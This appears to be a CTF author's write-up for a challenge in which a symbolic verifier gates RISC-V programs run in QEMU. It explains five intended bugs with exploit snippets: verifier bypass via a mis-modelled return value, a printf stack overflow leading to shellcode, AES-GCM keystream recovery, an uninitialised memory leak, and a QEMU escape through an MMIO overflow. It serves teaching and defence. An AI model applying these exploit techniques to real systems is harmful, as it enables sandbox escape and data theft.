# Gatekeeper

BPF? We've got BPF at home. BPF at home:

![gatekeeper frontend](/images/gatekeeper.png)

## TL;DR

- You write bare‑metal RISCV-64 programs (no OS, no libc).
- Submit program bytes to `/verify` -> if it passes, you get a signature.
- Send program + signature to `/execute` -> service runs it inside QEMU and returns your stdout.
- Your code must use provided trusted wrappers (`create_file_enc`, `mini_printf`, ...). Direct MMIO pokes are not allowed.

## Service Architecture

### Verifier

Verifier is quite picky about what you're allowed to do in the given environment. For example, your program can't have symbolic control flow, e.g., you can't do branching on conditions which you've derived from the symbolic data. It also has extensive whitelist of allowed instructions and constructs, and not only that. Here's a non-exhaustive list of checks that it performs:

1. Proving that all control flow is deterministic and non-symbolic.
2. Ensuring that only allowed instructions are used.
3. Proving memory can never be accessed outside of the allocated regions. In particular, it performs symbolic memory reasoning to ensure no out-of-regions accesses are possible even in presence of complex pointer arithmetic that involves symbolic values.
4. Limiting the number of instructions executed.
5. Ensuring code can only be executed from the code region.
6. Trusted-API compliance checks. We make sure every invocation of a trusted function conforms to its specification, in particular:
   - All pointer arguments point to valid memory regions of sufficient size.
   - No symbolic values are passed to the trusted functions (apart from some specific exceptions).
   - All size/count arguments are within allowed limits.
7. No uninitialized memory is ever read. Especially memory that was used by the trusted-guest code.
8. And much more...

Check out the `sources/verifier/` directory for more details.

### Executor

The executor runs your verified programs inside QEMU, with a custom MMIO device that provides the trusted interface for file operations and output.

#### MMIO-Device

MMIO device is responsible for handling trusted calls from the guest code. It exposes a set of API functions that the guest code can use to interact with the host environment.

#### Trusted-Guest code

This is the "privileged" part of the code that runs inside the QEMU VM and has access to the MMIO device. It implements the trusted API functions that the untrusted (but verified) guest code can use.

#### Untrusted-Guest code

Finally, this is your code! First it gets verifier, and if all checks pass, it gets executed inside the QEMU VM.

## Setting Up and Running

### How to compile?

From inside `gatekeeper/example_program/` directory run:

```bash
make all
```

### How to verify (cli interface)

From inside `gatekeeper/service/verifier` directory run:

```bash
python -m triton_verifier.main <path to example_program>/build/example.bin
```

# Vulnerabilities

The single goal of all exploits is to escape the verifier's safety guarantees and run unverified code inside the QEMU VM. As soon as you can run arbitrary code you could access the handles table at `0x13400000` and leak all public/private handles. Acquiring public handles is enough to read all non-encrypted files on the system.

To further develop the attack and also exfiltrate encrypted flags, one needed to chain "verifier-bypass" primitives with either QEMU-escape or crypto-attacks.

## 1. Improper modelling of return values for some trusted functions

The verifier models trusted-lib functions to prove safety, but incorrect or incomplete models create exploits. If a model fails to enforce return-value ranges, the verifier and runtime can desynchronize. In Gatekeeper, `read_file_plain` and `read_file_enc` had mis-modeled returns, letting attackers exploit the verifier/runtime mismatch to bypass checks and run arbitrary code in the QEMU VM.

The flawed model for `read_file_plain`/`read_file_enc` only considered a single return value (0), neglecting the full range of possible returns (0 or -1).

```python
ret32_var = self._ctx.newSymbolicVariable(
    32, f"read_file_enc_ret32_{self._total_executed}"
)
ret32 = ast.variable(ret32_var)
ret_sext = ast.sx(a0.getBitSize() - 32, ret32)

self._ctx.setConcreteRegisterValue(a0, 0)
sexpr = self._ctx.newSymbolicExpression(
    ret_sext, f"read_file_enc_ret_{self._total_executed}"
)
self._ctx.assignSymbolicExpressionToRegister(sexpr, a0)
self._ctx.pushPathConstraint(
    ast.equal(ret32, ast.bv(0, 32)),
)
```

A correct fix would be to properly constrain the return value to be either `0` or `-1` (indicating success or failure), as shown below:

```python
# 5) Return a0 ∈ {0, -1} (32-bit), sign-extended to XLEN
ast = self._ctx.getAstContext()
a0 = self._ctx.registers.a0

ret32_var = self._ctx.newSymbolicVariable(
    32, f"read_file_enc_ret32_{self._total_executed}"
)
ret32 = ast.variable(ret32_var)
ret_sext = ast.sx(a0.getBitSize() - 32, ret32)

# assign with a concrete representative (0) and constrain domain
self._ctx.setConcreteRegisterValue(a0, 0)
sexpr = self._ctx.newSymbolicExpression(
    ret_sext, f"read_file_enc_ret_{self._total_executed}"
)
self._ctx.assignSymbolicExpressionToRegister(sexpr, a0)
self._ctx.pushPathConstraint(
    ast.lor(
        [
            ast.equal(ret32, ast.bv(0, 32)),
            ast.equal(ret32, ast.bv(0xFFFFFFFF, 32)),  # -1
        ]
    )
)
```

The issue could've been exploited by building a program that used an array of function pointers, and using the mis-modeled return value to index into this array. This way, when the verifier tried to prove that the PC could only take one value (no branching on symbolic data, `_try_prove_jalr_has_only_1_target_if_symbolic`), it would fail to consider the other options, leading to a situation where the verifier thought the code was safe, but at runtime it would jump to an arbitrary function.

An example exploit code snippet:

```c
void qemu()
{
    TRUSTED_CALL_VOID(mini_printf, "Should be only seen in QEMU! Reading Prohibited address: %llx\n", *(uint64_t*)0x13400000);
}

void verifier()
{
    TRUSTED_CALL_VOID(mini_printf, "Should be only seen in Verifier! Totally safe (trust me, bro)...\n");
}

ENTRY_POINT_ATTR void start()
{
    char file_data[128] = { 0 };
    uint32_t len = sizeof(file_data);
    int32_t result =
        TRUSTED_CALL(read_file_plain, 0x4141414141414141ULL, (uint8_t*)file_data, &len);

    void* ptrs[2] = { (void*)qemu, (void*)verifier };
    ((void (*)())ptrs[result + 1])();

    ENTRY_POINT_END();
}
```

Full exploit: [exploit-verifier-non-symbolic-ret.py](./exploit/exploit-verifier-non-symbolic-ret.py)

## 2. BOF in printf implementation (Trusted-Guest code)

Another way to bypass the verifier lay in the trusted-guest code, specifically in the `mini_printf` implementation. The `mini_printf` function used a fixed-size buffer for numeric conversions, which could be overflowed by large integers if base-2 formatting was used (strictly speaking, even with base-10, a 4-byte overflow is possible, but it's not enough to gain code execution). By crafting sufficiently large numbers it was possible to overwrite return address and gain code execution in the context of the trusted-guest code.

Vulnerable code snippet:

```c
void out_u64_base(uint64_t v, uint32_t base)
{
    // @VULN
    char buf[16] = { 0 };
    const char* digits = "0123456789abcdef";
    int32_t i = 0;

    ...

    while (v) {
        buf[i++] = digits[v % base];
        v /= base;
    }
    buf[i] = '\0';
```

The patch could've been implemented in several ways. Either by increasing stack frame size, or by fully-rewriting this function from scratch and replacing it using a binary patch.

To exploit this vulnerability, an attacker could call `mini_printf` with a large base-2 number, causing the buffer overflow and overwriting the return address to point to their own shellcode. This shellcode in turn could then perform arbitrary actions within the trusted-guest environment.

It should be noted, that while the BOF is quite a powerful primitive, in this context it is significantly limited by the fact that only 3 possible bytes could be written (`\x30`, `\x31` and terminating `\x00`) out of bounds. However, luckily for the attacker, the memory layout includes some useful segments that can be targeted:

```python
"user-code": (0x300000, 0x300000 + 0x10000, "r-x"),
"user-data": (0x310000, 0x310000 + 0x10000, "rw-"),
"stack": (0x320000, 0x320000 + 0x20000, "rw-"),
```

```c
__attribute__((used)) void do_exploit()
{
    // Read handles table, and dump the files.
    ...
    ENTRY_POINT_END();
}

void proxy()
{
    __asm__ __volatile__(
        ".globl proxy_blob_begin\n"
        "proxy_blob_begin:\n"
        ".option push\n"
        ".option nopic\n" // ensure `la` expands to auipc+addi, not GOT
        ".option norvc\n"

        "la     t0, __abs_target\n" // GAS expands to auipc+addi with proper hi/lo pairing
        "ld     t0, 0(t0)\n"        // t0 = *(abs_target) = do_exploit
        "jalr   ra, t0, 0\n"        // call absolute target
        "ret\n"

        ".balign 8\n"
        "__abs_target:\n"
        ".dword  do_exploit\n" // embed absolute pointer inside the blob

        ".option pop\n"
        ".globl proxy_blob_end\n"
        "proxy_blob_end:\n");
}

ENTRY_POINT_ATTR void start()
{
    // Triggers BOF, and jumps to our pre-inited data.
    memcpy((void*)0x313130, (void*)&proxy, 0x40);
    TRUSTED_CALL_VOID(mini_printf, "%b\n", 0b110ull << 56ull);
    ENTRY_POINT_END();
}
```

Full exploit: [exploit-trusted-funcs-bof.py](./exploit/exploit-trusted-funcs-bof.py)

<!-- ## 3. Stack overflow due to QEMU/verifier stack size mismatch -->

## 3. Ciphertext + IV leak via file type confusion

The first crypto-related vulnerability stemmed from a type confusion issue in the trusted-guest code. The trusted API provided two functions for reading files: `read_file_plain` for plaintext files and `read_file_enc` for encrypted files. However, it was not enforced that the correct function was used for the corresponding file type. This oversight allowed an attacker to read encrypted files using the `read_file_plain` function, which did not perform any decryption. As a result, the attacker could obtain the raw ciphertext and IV of encrypted files.

As soon as IV and ciphertext are known, due to the fact that AES-GCM is used, it is possible to perform keystream-recovery and thus plaintext recovery for arbitrary encrypted files. The attack proceeds as follows:

```c
// 1. Leak ciphertext + IV of an encrypted file via file type confusion
read_file_plain(<leaked public handle of encrypteed file>, file_buffer_leak, &len);
memcpy(iv, file_buffer_leak, 12);

// 2. Create a new encrypted file with known plaintext and leaked IV to recover keystream
uint64_t new_handle = create_file_enc(all_zeroes, sizeof(all_zeroes), (uint32_t *)iv, (uint32_t *)tag);
read_file_plain(new_handle, file_buffer_known, &len2);

// 3. Recover plaintext by XORing known plaintext ciphertext with leaked ciphertext
for (uint32_t i = 0; i < len - 12; ++i) {
    mini_printf("%c", file_buffer_known[12 + i] ^ file_buffer_leak[12 + i]);
}
```

The issue could've been fixed by adding type checks in the verifier to ensure that `read_file_plain` is only used with plaintext files.

Full exploit: [exploit-type-confusion.py](./exploit/exploit-type-confusion.py)

## 4. Ciphertext + IV leak via uninitialized memory

The second crypto-related issue arose from the handling of uninitialized memory in the trusted-guest code. The verifier and executor are built to ensure that no data leaks are possible from "privileged" context (trusted-guest code) to "unprivileged" context (untrusted-guest code). This is enforced both at the verifier level (no uninitialized memory reads are allowed) and at the executor level (trusted-guest code cleans up caller-saved registers before returning to untrusted code).

This is implemented not only to protect sensitive data but even more importantly to prevent state desynchronization between verifier and executor.

However, if verifier-bypass is achieved, an attacker can freely exploit uninitialized memory reads to leak sensitive data (or directly access the MMIO device). In this case, the attacker could read uninitialized stack memory after invoking `read_file_enc`, which would contain the ciphertext and IV of the encrypted file being read.

The overall exploitation than is similar to the previously described issue, but instead of leaking ciphertext + IV via file type confusion, it is leaked via uninitialized memory read.

As the issue is fundamentally on architecture level (we can always execute `_mmio_read_plain` if verifier is bypassed, and `_mmio_read_plain` can't really be changed, as it is used legitimately by trusted-guest code while working with encrypted files), the fix is to ensure that 2 previously mentioned verifier-bypasses are fixed.

Full exploit: [exploit-ciphertext-leak.py](./exploit/exploit-ciphertext-leak.py)

## 5. QEMU-escape via MMIO device

Finally, the most powerful primitive was to directly escape QEMU via the MMIO device. The bug firstly requires verifier-bypass to be exploitable, as otherwise the trusted-api compliance checks would prevent any invalid MMIO accesses.

With unlimited MMIO access, the implicitly-encoded (via `trusted_lib`) communication contract with the MMIO device can be violated in various ways, leading to inconsistent states and ultimately code execution in QEMU.

For example, the `LENDW` register write operation sets the length of the file data to be written, but it is never capped to the actual size of the `file_buffer`. Thus, by writing a large value to `LENDW`, followed by multiple writes to `FILEDW`, it is possible to overflow the `file_buffer` and overwrite adjacent memory in the MMIO device state structure.

```c
__attribute__((noinline)) static void gatekeeper_device_write(void *opaque, hwaddr addr, uint64_t val, unsigned size) {
    GatekeeperDeviceState *s = opaque;

    switch (addr) {
        ...

    case GATEKEEPER_REG_LENDW:
        s->len_dw = val;
        break;

    case GATEKEEPER_REG_FILEDW:
        if (s->file_pos < s->len_dw * 4) {
            s->file_dw = val;
            memcpy(&s->file_buffer[s->file_pos], (uint8_t *)&val, 4);
            s->file_pos += 4;
        }

        ...

        break;
    
```

Similarly, it is possible to leak memory by issuing `REG_FILEDW` read requests:

```c
__attribute__((noinline)) static uint64_t gatekeeper_device_read(void *opaque, hwaddr addr, unsigned size) {
    GatekeeperDeviceState *s = opaque;
    uint64_t val = 0;

    switch (addr) {
        ...
    case GATEKEEPER_REG_FILEDW:
        if (s->file_pos < s->len_dw * 4) {
            memcpy((uint8_t *)&val, &s->file_buffer[s->file_pos], 4);
            s->file_pos += 4;
        }
    ...
```

With both read and write primitives, it is possible to find FILE structures in memory and overwrite fops table to gain code execution in QEMU. With that a simple stack pivot + `mprotect` ROP-chain can be used to gain shellcode execution and full system compromise.

Full exploit: [exploit-qemu-escape.py](./exploit/exploit-qemu-escape.py)
